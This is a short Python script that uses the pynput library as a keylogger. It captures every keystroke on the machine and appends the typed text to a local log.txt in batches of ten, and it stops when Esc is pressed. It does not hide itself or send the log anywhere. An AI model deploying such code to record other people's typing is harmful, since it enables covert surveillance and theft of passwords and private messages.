import pynput

from pynput.keyboard import Key, Listener

count = 0                       #counter for keystrokes
limiter = 10                    #number of keystrokes after where txt is written
keys = []                       #list of kestrokes


def on_press (key):
    global count, keys
    
    keys.append(key)
    count += 1 
    print("{0} pressed".format(key))
    #print(key)

    if count >= limiter:
        count = 0
        write_log_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False

def write_log_file (keys):
    with open("log.txt","a") as f:
        for key in keys:
            key_log = str(key).replace("'","")    #removes the queot mark that is included by listener and replace by blank
            if key_log.find("space") > 0:         #finds space words 
                f.write(' ')
            elif key_log.find("Key") == -1:
                f.write(key_log)
            elif key_log.find("enter") > 0:
                f.write('\n')

with Listener (on_press=on_press, on_release=on_release) as listener:
    listener.join()

